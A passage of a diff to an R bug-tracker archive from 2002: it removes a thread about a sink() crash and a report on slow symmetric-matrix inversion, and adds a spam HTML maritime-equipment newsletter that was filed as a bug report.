-since it is possible to force [R] into an instable and unleavable state,
-which is likely to crash [R].
-
-> It's better to call file() and then open(), which will avoid the problem.
-
-I definitely agree, now when you have told me.
- 
-> > FYI: Doing a cat(file="tmp.txt", k") instead of the close(file(...)) call,
-> > will produce a "sink stack is full" error.
-> >
-> > FYI2: After the failure above, trying to call sink() will result in a
-> >       "Segmentation fault" and [R] is stopped.
-> >
-> > Background: I ran into this problem after have been running the same
-> > script several times over several days I eventually ran into the problem.
-> > It was hard to identify the problem, but I believe the above example shows
-> > the core of it and I could not track the problem further.
-> >
-> > Unfortunately, I do not have access to R v1.4.1 for Solaris 8.
-> >
-> >
-> > -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
-> > r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
-> > Send "info", "help", or "[un]subscribe"
-> > (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
-> > _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
-> >
-> 
-> -- 
-> Brian D. Ripley,                  ripley@stats.ox.ac.uk
-> Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
-> University of Oxford,             Tel:  +44 1865 272861 (self)
-> 1 South Parks Road,                     +44 1865 272860 (secr)
-> Oxford OX1 3TG, UK                Fax:  +44 1865 272595
-
-Thanks
-
-Henrik Bengtsson
-
-Dept. of Mathematical Statistics @ Centre for Mathematical Sciences 
-Lund Institute of Technology/Lund University, Sweden (+2h UTC)
-Office: P316, +46 46 222 9611 (phone), +46 46 222 4623 (fax)
-h b @ m a t h s . l t h . s e, http://www.maths.lth.se/bioinformatics/
-
-
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 * PR# 1356 *
 Subject: bessel_i
 From: martin.schlather@uni-bayreuth.de
@@ -14921,146 +14679,1136 @@ A very simple package that calls test() can be found at
 
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-* PR# 1361 *
-Subject: Matrix identification bug
-From: hyu@stats.uwo.ca
-Date: Tue, 5 Mar 2002 21:19:46 +0100 (MET)
+* PR# 1362 *
+Subject: Maritime Newsletter (Week 10)
+From: "MarineDigital Inc."<newsletter@marinedigital.com>
+Date: Fri, 8 Mar 2002 00:49:33 +0900
 -- no notes --
 ~~~~~~~~~~ original reports follow ~~~~~~~~~~
-==> 1361 <==
-From hyu@stats.uwo.ca  Tue Mar  5 21:19:46 2002
-Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA08030
-	for <R-bugs@biostat.ku.dk>; Tue, 5 Mar 2002 21:19:46 +0100 (MET)
-Date: Tue, 5 Mar 2002 21:19:46 +0100 (MET)
-From: hyu@stats.uwo.ca
-Message-Id: <200203052019.VAA08030@pubhealth.ku.dk>
-To: R-bugs@biostat.ku.dk
-Subject: Matrix identification bug
+==> 1362 <==
+From newsletter@marinedigital.com  Thu Mar  7 16:51:46 2002
+Received: from localhost ([61.32.165.40])
+	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id QAA22920
+	for <r-bugs@biostat.ku.dk>; Thu, 7 Mar 2002 16:50:58 +0100 (MET)
+Message-Id: <200203071550.QAA22920@pubhealth.ku.dk>
+Reply-To: newsletter@marinedigital.com
+From: "MarineDigital Inc."<newsletter@marinedigital.com>
+To: r-bugs@biostat.ku.dk
+Subject: Maritime Newsletter (Week 10)
+Mime-Version: 1.0
+Content-Type: text/html; charset="iso-8859-1"
+Date: Fri, 8 Mar 2002 00:49:33 +0900
 
-Full_Name: Hao Yu
-Version: 1.4.1
-OS: Windws and Linux
-Submission from: (NULL) (129.100.45.161)
+<!-- saved from url=(0022)http://internet.e-mail -->
+<!-- saved from url=(0022)http://internet.e-mail -->
+<!-- saved from url=(0022)http://internet.e-mail -->
+<html>
+<head>
+<title>MarineDigital Newsletter</title>
+<link rel="stylesheet" type="text/css" href="http://www.marinedigital.com/style_marine.css">
+</head>
 
-
-Hi,
-   Recently we did some benchmarks regarding matrix inverse operation and found
-some strange things. See the following results (the package Matrix is most
-updated).
-
-1. load the function Toeplitz and library(Matrix)
-"Toeplitz"
-function(x)
-{
-        matrix(x[1 + abs(outer(seq(along = x), seq(along = x), FUN = "-"))], 
-                byrow = T, ncol = length(x))
-}
-2. On a PIII 1.125GHz (256kb cache)desktop PC with win2k, the results are
-> system.time(solve(Toeplitz(.5^seq(0,999))))
-[1] 38.25  0.22 42.01    NA    NA
-> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
-[1] 28.01  0.17 30.94    NA    NA
-
-On a PIII-M 1.2GHz (512kb cache) laptop PC with winxp pro, the results are
-> system.time(solve(Toeplitz(.5^seq(0,999))))
-[1] 33.94  0.25 34.01    NA    NA
-> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
-[1] 9.40  0.13 9.54    NA    NA
-
-On a PIII Xeon 1GHz (256kb cache) RedHat 7.2 Linux, the results are
-> system.time(solve(Toeplitz(.5^seq(0,999))))
-[1] 53.79  0.48 00.01    NA    NA
-> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
-[1] 30.29  0.21 30.59    NA    NA
-
-This was the first time that windows R outperformed linux R even PIII Xeon 1GHz
-is slightly faster than PIII 1.125GHz. Notice the abnormal result 9.4s from
-PIII-M 1.2GHz (cannot be three times faster). After using native fortran lapack
-(call to dpotrf and dpotri returns 9s for PIII Xeon), I realized that R may
-treat the matrix as a general matrix rather than symmetric except the abnormal
-case.  To confirm this, I modified the R_LapackPP.cc in Matrix package and it
-turned out that
-    is.MMatrix() failed to return true.
-Hence 
-        if (checkClass(classes, "Hermitian")) 
-            return new LaSymmMatDouble(x);
-is not executed in static LaMatDouble* asLaMatrix(SEXP x). Instead
-    if (isMatrix(x)) {
-            return new LaGenMatDouble(x);  
-        }
-is used. 
-After replaced
-    return new LaGenMatDouble(x);   
-with 
-    return new LaSymmMatDouble(x);
-
-the result was (PIII Xeon 1GHz RedHat 7.2 Linux))
-> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
-[1] 9.76 0.22 9.97 0.00 0.00
-
-Clearly there are some bugs in solve() and solve.Matrix(). Notice that all have
-> is.Hermitian(Toeplitz(.5^seq(0,999)))
-[1] TRUE
-
-
-Thanks 
-Hao Yu
-
-
-==> 1361.followup.1 <==
-From ripley@stats.ox.ac.uk  Tue Mar  5 22:32:30 2002
-Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA08212
-	for <R-bugs@biostat.ku.dk>; Tue, 5 Mar 2002 22:32:30 +0100 (MET)
-Received: from tern.stats (pc2-oxfo4-0-cust120.oxf.cable.ntl.com [62.254.131.120])
-	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id VAA24644;
-	Tue, 5 Mar 2002 21:31:57 GMT
-Date: Tue, 5 Mar 2002 21:32:31 +0000 (GMT Standard Time)
-From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
-To: hyu@stats.uwo.ca
-cc: R-bugs@biostat.ku.dk
-Subject: Re: [Rd] Matrix identification bug (PR#1361)
-In-Reply-To: <200203052019.VAA08035@pubhealth.ku.dk>
-Message-ID: <Pine.WNT.4.44.0203052125210.1136-100000@tern.stats>
-Sender: ripley@stats.ox.ac.uk
+<body bgcolor="#FFFFFF" text="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<div align="center">
+      <table width="590" border="0" bordercolordark="#ffffff" bordercolorlight="#808040" cellspacing="0" cellpadding="0" height="1711">
+            <tr><td width="590" valign="top" height="54">
+                     <table width="590" border="0" cellspacing="0" cellpadding="0">
+                            <tr><td><img src="http://www.marinedigital.com/en/news/img/top.gif" width="580" height="50"></td></tr>
+                     </table>
+                </td>
+            </tr>
+            <tr><td height="1" bgcolor="#ffffff"></td></tr>
+            <tr><td height="17" bgcolor="#A9340F" align="center" class="wtext"><a href="http://www.marinedigital.com/en/mall/ship/index.asp"><font color="#ffffff">SHIP S&P</font></a> &nbsp;<b>l</b>&nbsp; <a href="http://www.marinedigital.com/en/mall/product/index.asp"><font color="#ffffff">NEW PRODUCT S&P</font></a>                                                                                                                 
+                 &nbsp;<b>l</b>&nbsp; <a href="http://www.marinedigital.com/en/mall/equipment/index.asp"><font color="#ffffff">USED PRODUCT S&P</font></a> &nbsp;<b>l</b>&nbsp;                                                                                 
+                <a href="http://www.marinedigital.com/en/mall/spare/index.asp"><font color="#ffffff">SPARE                                                                                 
+                PART S&P</font></a> &nbsp;<b>l</b>&nbsp; <a href="http://www.marinedigital.com/en/mall/partner/index.asp"><font color="#ffffff">PARTNER ALLIANCE</font></a></td></tr>                                                                                                                
+            <tr><td height="1" bgcolor="#000000"></td></tr>                                                                                                                
+            <tr><td height="1608">                                                                                                                   
+                     <table border="0" cellspacing="1" cellpadding="0" bgcolor="#999999" height="1">                                                                                                                
+                            <tr><td width="170" valign="top" bgcolor="#ffffff" height="1">                                                                                                                
+                                     <table width="170" border="0" cellspacing="0" cellpadding="0">                                                                                                                
+                                            <tr><td bgcolor="#FDAE02" align="center" class="wtext" style="padding-top: 0; padding-bottom: 0"><font color="#2B4996"><b>WEEK      
+                                                10</b></font><br><b>ISSUE 52,      
+                                                6th, Mar. 2002</b><br><a href="http://www.marinedigital.com">www.marinedigital.com</a></td></tr>                                                                                                              
+                                            <tr><td height="1" bgcolor="#FBE6B6" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                              
+                                            <tr>               
+                                              <td bgcolor="#FDD06D" class="text" style="padding-top: 0; padding-bottom: 0"><b>&nbsp;               
+                                                - Newsletter Receivers -</b><br>&nbsp;&nbsp;&nbsp;                                         
+                                                <font color="#E1330B">                                              
+                                                <b>119,861</b>                                             
+                                                </font>                                               
+                                                Maritime people<br>&nbsp;&nbsp;&nbsp;<font color="#E1330B"><b>                                                            
+                                                54,073                                                           
+                                                </b></font>                                                           
+                                                Companies</td>                                                                            
+                                            </tr>               
+                                            <tr>               
+                                              <td height="1" bgcolor="#E26D20" style="padding-top: 0; padding-bottom: 0"></td>               
+                                            </tr>               
+                                            <tr>               
+                                              <td height="3" bgcolor="#FDAE02" style="padding-top: 0; padding-bottom: 0"></td>               
+                                            </tr>               
+                                            <tr>                                                                           
+                                              <td bgcolor="#FDD06D" class="text" style="border: 2 outset #FFFFFF; padding-top: 2; padding-bottom: 2">               
+                                                <p align="center">                                                                   
+                                                              <a href="http://www.marinedigital.com/en/newsletter_form/letter.asp"><font color="#990000"><b>Subscribe                                                                         
+                                                              the newsletter</b></font></a>                                                                         
+                                                </p>               
+                                              </td>                                                                            
+                                            </tr>                                                                            
+                                            <tr>                                                                           
+                                              <td bgcolor="#FDD06D" class="text" style="border: 2 outset #FFFFFF; padding-top: 2; padding-bottom: 2">               
+                                                <p align="center">              
+                                                <align="center"><a href="http://www.marinedigital.com/en/mar_unsubscribe.asp?nw_email=r-bugs@biostat.ku.dk" target="_blank"><font color="#FF0000"><b>Unsubscribe</b></font></a><font color="#FF0000"><b></b></font></p>            
+                                              </td>                                                                         
+                                            </tr>                                                                         
+                                            <tr><td height="1" bgcolor="#E26D20" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                           
+                                            <tr><td height="3" bgcolor="#FDAE02" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                        
+                                            <tr><td bgcolor="#FD7E02" class="wtext" align="center" style="padding-top: 0; padding-bottom: 0"><b>YOUR FREE POSTING</b></td></tr>                                                                                                          
+                                            <tr><td height="1" bgcolor="#990000" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                          
+                                            <tr><td bgcolor="#FCE1A4" class="text" height="35" style="padding-top: 0; padding-bottom: 0"><img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/ship/index.asp?menu_code=ShipSaleRegister">Sell Ship</a><br>                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/ship/index.asp?menu_code=ShipPurchaseRegister">Purchase Ship</a></td></tr>                                                                                                          
+                                            <tr><td height="1" bgcolor="#A27D5F" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                         
+                                            <tr><td bgcolor="#FCE1A4" class="text" height="35" style="padding-top: 0; padding-bottom: 0">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/Product/index.asp?menu_code=ShipSaleRegister">Sell New Product</a><br>                                                                                                         
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/Product/index.asp?menu_code=ShipPurchaseRegister">Purchase New Product</a></td></tr>                                                                                                         
+                                            <tr>                                   
+                                              <td height="1" bgcolor="#A27D5F" style="padding-top: 0; padding-bottom: 0"></td>                                   
+                                            </tr>                                   
+                                            <tr>                                   
+                                              <td bgcolor="#FCE1A4" class="text" height="35" style="padding-top: 0; padding-bottom: 0">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentSaleRegister">Sell Used Product</a><br>                                                                                                         
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentPurchaseRegister">Purchase Used Product</a></td>                                   
+                                            </tr>                                   
+                                            <tr><td height="1" bgcolor="#A27D5F" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                         
+                                            <tr><td bgcolor="#FCE1A4" class="text" height="35" style="padding-top: 0; padding-bottom: 0">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11">                                  
+                                                <a href="http://www.marinedigital.com/en/mall/Inventory/index.asp?menu_code=InventorySaleRegister">Sell                                    
+                                                Inventories</a><b><img border="0" src="http://www.marinedigital.com/en/news/img/icon_new.gif" width="31" height="12"></b><br>                                                                                                         
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11">                                   
+                                                <a href="http://www.marinedigital.com/en/mall/Inventory/index.asp?menu_code=InventoryPurchaseRegister">Purchase                                    
+                                                Inventories</a><b><img border="0" src="http://www.marinedigital.com/en/news/img/icon_new.gif" width="31" height="12"></b></td></tr>                                                                                                         
+                                            <tr><td height="1" bgcolor="#A27D5F" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                         
+                                            <tr><td bgcolor="#FCE1A4" class="text" height="35" style="padding-top: 0; padding-bottom: 0">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/Spare/index.asp?menu_code=SpareSaleRegister">Sell Spare Part</a><br>                                                                                                         
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/Spare/index.asp?menu_code=SparePurchaseRegister">Purchase Spare Part</a></td></tr>                                                                                                         
+                                            <tr><td height="1" bgcolor="#A27D5F" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                         
+                                            <tr>             
+                                              <td bgcolor="#FCE1A4" class="text" height="35" style="padding-top: 0; padding-bottom: 0">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/Partner/index.asp?menu_code=PartnerLookingRegister">Looking for Partner</a><br>                                                                
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/mall/Partner/index.asp?menu_code=PartnerWantingRegister">Wanting your Partner</a></td>             
+                                            </tr>             
+                                            <tr><td height="1" bgcolor="#A27D5F" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                        
+                                            <tr><td bgcolor="#FCE1A4" class="text" height="35" style="padding-top: 0; padding-bottom: 0">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/ship_repairs/form/repair.asp">Ship Repair Inquiry</a><br>                                                                                                        
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/ship_repairs/form/regist01.asp">Join Repair Network</a></td></tr>                                                                                                        
+                                            <tr><td height="1" bgcolor="#A27D5F" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                        
+                                            <tr><td bgcolor="#FCE1A4" class="text" style="padding-top: 0; padding-bottom: 0">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.marinedigital.com/en/products_sell/registration/form.asp">PANAMA Flag Registration</a></td></tr>                                                                                                        
+                                            <tr><td height="1" bgcolor="#A27D5F" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                        
+                                            <tr><td bgcolor="#FCE1A4" class="text" style="padding-top: 0; padding-bottom: 0">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"> <a href="http://www.netnaru.net/marinedigital/en/tracking_sys/main.asp">Ship Tracking System</a></td></tr>                                                                                                         
+                                            <tr><td bgcolor="#FD7E02" height="5" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                 
+                                            <tr><td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                                                
+                                            <tr><td bgcolor="#FDD06D" class="text" align="center" height="13" valign="middle" style="padding-top: 0; padding-bottom: 0"><b><font color="#990000">::                                       
+                                                YOUR BANNER ADVERTISEMENT(US$70) ::</font></b></td></tr>                                                                                              
+                                            <tr><td bgcolor="#FDD06D" class="text" align="center" height="15" valign="middle" style="padding-top: 0; padding-bottom: 0">                                                                                        
+                                                <p align="right">                                                                                                          
+                                                                                               <img src="http://www.marinedigital.com/en/news/img/button.gif" width="12" height="11"><font color="#666666"><b>                       
+                                                <font color="#808080"><a href="http://www.marinedigital.com/en/mall/product/index.asp?menu_code=ShipSaleView&amp;GoodsNo=S51602036">Send                       
+                                                your Ads</a></font></b></font></td></tr>                                                                                             
+                                            <tr>                                                                        
+                                              <td bgcolor="#FDD06D" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                                                        
+                                            </tr>                                                                        
+                                            <tr>                                   
+                                              <td bgcolor="#FCE1A4" height="7"><a href="http://www.specsvision.com"><img border="0" src="http://www.marinedigital.com/en/news/img/banner_specs.jpg" width="170" height="45"></a></td>                                 
+                                            </tr>                                 
+                                            <tr>             
+                                              <td bgcolor="#FCE1A4" height="7"><a href="http://www.marinedigital.com/en/products_sell/hdvalve/intro.asp"><img border="0" src="http://www.marinedigital.com/en/news/img/banner_valve.gif" width="170" height="45"></a></td>                                                                    
+                                            </tr>             
+                                            <tr>                                                                     
+                                              <td bgcolor="#FCE1A4" height="7"><a href="http://www.marinedigital.com/en/products_sell/nasan/introduction.asp"><img border="0" src="http://www.marinedigital.com/en/news/img/nasan-41.gif" width="170" height="45"></a></td>                                                                   
+                                            </tr>                                                                   
+                                            <tr><td bgcolor="#FDD06D" height="7" style="padding-top: 0; padding-bottom: 0"></td></tr>                                                                               
+                                            <tr><td bgcolor="#FDAE02" style="padding-top: 0; padding-bottom: 0"><p align="left" style="margin-left:7px;" class="text">                                                                       
+                                                 <font color="#4C598F">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>::: Contact Point :::</b>                                                                                        
+                                                     <br>Business Team, <a href="mailto:sales@marinedigital.com">Steve Kim</a><br>                                                                                           
+                                                         Tel : 82-2-966-6701<br>Fax : 82-2-966-6703</font></td></tr>                                                                                               
+                                                                                                      
+                                            <tr>                                                      
+                                              <td bgcolor="#FDD06D" height="7" style="padding-top: 0; padding-bottom: 0"></td>                                                           
+                                            </tr>                                                      
+                                                                                                      
+                                            <tr>                          
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                         
+                                            </tr>                          
+                                                                                                      
+                                            <tr>                                                           
+                                              <td bgcolor="#DBDBDD" align="center" class="text" height="17" style="padding-top: 0; padding-bottom: 0"><font color="#4C558F"><b>Hot Products(Secondhand)</b></font>                                                                                                  
+                                </td>                                                           
+                                            </tr>                                                          
+                                            <tr>                          
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                         
+                                            </tr>                          
+                                            <tr>                                             
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0" bgcolor="#FBE6B6">                                                         
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10512002&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><img border="0" src="http://www.marinedigital.com/en/news/img/Tire_crane.jpg" width="112" height="73"></a></td>                                                    
+                                            </tr>                                         
+                                            <tr>                                       
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                       
+                                            </tr>                                       
+                                            <tr>                                         
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0">                                                   
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10512002&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><b>Hydro     
+                                                Crane (Tire Type)</b></a></td>                                                     
+                                            </tr>                                          
+                                            <tr>                                        
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                        
+                                            </tr>                                        
+                                            <tr>                                          
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0" bgcolor="#FBE6B6">                                                      
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10502005"><img border="0" src="http://www.marinedigital.com/en/news/img/110ton.jpg" width="112" height="68"></a></td>                                                    
+                                            </tr>                                         
+                                            <tr>                                       
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                       
+                                            </tr>                                       
+                                            <tr>                                         
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0">                                                   
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10502005"><b>110Ton     
+                                                Transporter</b></a></td>                                                      
+                                            </tr>                                           
+                                            <tr>                                         
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                         
+                                            </tr>                                         
+                                            <tr>                                           
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0" bgcolor="#FBE6B6">                                                       
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10511011&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><img border="0" src="http://www.marinedigital.com/en/news/img/S10511011-2.gif" width="112" height="68"></a></td>                                                     
+                                            </tr>                                          
+                                            <tr>                                        
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                        
+                                            </tr>                                        
+                                            <tr>                                          
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0">                                                    
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10511011&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><b>Traveling                                         
+                                Crane</b></a></td>                                                    
+                                            </tr>                                         
+                                            <tr>                                        
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                        
+                                            </tr>                                        
+                                            <tr>        
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0" bgcolor="#FBE6B6">                                                     
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10181003&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><img src="http://www.marinedigital.com/en/news/img/press.gif" border="0" width="112" height="75"></a></td>                                                    
+                                            </tr>        
+                                            <tr>        
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                        
+                                            </tr>        
+                                            <tr>        
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0">                                                   
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10181003&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><b>Bending                                           
+                                                Press</b></a></td>                                                     
+                                            </tr>        
+                                            <tr>        
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                          
+                                            </tr>        
+                                            <tr>               
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0" bgcolor="#FBE6B6">                                                     
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10501003&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><img src="http://www.marinedigital.com/en/news/img/SkyLift-52.jpg" border="0" width="110" height="73"></a></td>                                                   
+                                            </tr>              
+                                            <tr>              
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                       
+                                            </tr>              
+                                            <tr>              
+                                              <td height="7" style="padding-top: 0; padding-bottom: 0">                                                  
+                                                <p align="center"><a href="http://www.marinedigital.com/en/mall/Equipment/index.asp?menu_code=EquipmentSaleView&amp;gubun=S1&amp;GoodsNo=S10501003&amp;Fcategory=1&amp;Scategory=&amp;Tcategory="><b>Sky               
+                                                Lift (18M)</b></a></td>                                                    
+                                            </tr>              
+                                            <tr>              
+                                              <td bgcolor="#990000" height="1" style="padding-top: 0; padding-bottom: 0"></td>                                         
+                                            </tr>              
+                                     </table>                                                                                            
+                                </td>                                                                                            
+                               <td width="420" valign="top" align="right" bgcolor="#ffffff" height="1">                                                                                            
+                                      <table width="410" border="0" cellspacing="0" cellpadding="0" bgcolor="#999999" height="248">                                                                                            
+                                             <tr>                         
+                                              <td height="1" bgcolor="#DA4040" colspan="2" width="408"></td>                    
+                                             </tr>                    
+                                             <tr><td  class="text" align="center" bgcolor="#FED203" colspan="2" width="408" style="padding-top: 2; padding-bottom: 2" height="21"><B><font color="#294EFA">:: MARITIME NEWS ::</font></b>                                                                                     
+                                                 </td>                                                                                       
+                                             </tr>                                                                                     
+                                             <tr><td height="1" bgcolor="#DA4040" colspan="2" width="408"></td></tr>                                                                                     
+                                             <tr>                      
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                        
+                                                 &nbsp;1.                                                                                             
+                                                 </td>                                                                                              
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="9">                                                                                       
+ Imabari shipyard(Japan) contracted four 32000dwt Bulkers from Hsin Chien and Mingtai Navigation.                                                                                              
+                                                 </td>                                                                                               
+                                             </tr>                        
+                                             <tr>                        
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="1">                                                                                         
+                                                 &nbsp;2.                                                                                             
+                                                 </td>                                                                                              
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="1">                                                                                       
+                                                 Keppel FELS LTD(Singapore) clinched a contract  
+                                                 with GlobalSantaFe Co.(USA) to upgrade jack-up, Rig, at worth US$ 30mill.                                                                                                
+                                                 </td>                                                                                                 
+                                             </tr>                         
+                                             <tr>                         
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="1">                                                                                          
+                                                 &nbsp;3.                                                                                               
+                                                 </td>                                                                                                
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="1">                                                                                         
+                                                 Jo Tanker Co. ordered three(1+1+1) 25000dwt Stainless     
+                                                 Chemical Tankers from Kitanihon Shipyard (Japan).                                                                                                   
+                                                 </td>                                                                                                    
+                                             </tr>                         
+                                             <tr>                         
+                                              <td class="text" bgcolor="#FFFFEC" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="11">                                                                                             
+                                                 &nbsp;4.                                                                                                 
+                                                 </td>                                                                                                  
+                                              <td class="text" bgcolor="#FFFFEC" width="391" style="padding-top: 1; padding-bottom: 1" height="11">                                                                                           
+                                                 Austal Shipyard (Australia) contracted two     
+                                                 mono hull-type Cruisers with Bora Bora Cruises     
+                                                 (Tahiti Island), at worth US$     
+                                                 25.8mill.                                                                                                  
+                                                 </td>                                                                                                   
+                                             </tr>                         
+                                             <tr>                         
+                                              <td class="text" bgcolor="#ffffff" width="15" valign="top" style="padding-top: 1; padding-bottom: 1" height="17">                                                                                            
+                                                 &nbsp;5.                                                                                               
+                                                 </td>                                                                                                
+                                              <td class="text" bgcolor="#ffffff" width="391" style="padding-top: 1; padding-bottom: 1" height="17">                                                                                         
+                                                 EISA shipyard(Brazil) got an order to build two 3800TEU     
+                                                 Container ships from Elianca Navegacao e Logistica (Brazil), at  
+                                                 approx. US$ 60mill./ship.                                                                                                    
+                                                 </td>                                                                                                     
